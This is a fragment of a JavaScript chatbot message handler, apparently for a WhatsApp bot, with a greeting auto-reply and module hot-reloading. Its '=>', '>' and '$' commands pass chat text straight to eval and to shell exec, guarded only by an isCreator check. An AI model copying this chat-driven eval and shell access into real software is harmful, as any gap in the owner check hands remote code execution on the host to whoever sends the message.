if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
m.reply(`WaalaikumSalam ${pushname}`)
}

if (budy.startsWith('=>')) {
    if (!isCreator) return

    function Return(sul) {
        sat = JSON.stringify(sul, null, 2)
        bang = util.format(sat)
        if (sat == undefined) {
            bang = util.format(sul)
        }
        return m.reply(bang)
    }
    try {
        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
        m.reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isCreator) return;
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
    } catch (err) {
        m.reply(String(err));
    }
}

if (budy.startsWith('$')) {
    if (!isCreator) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)
    })
}

}
} catch (err) {
    console.log(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
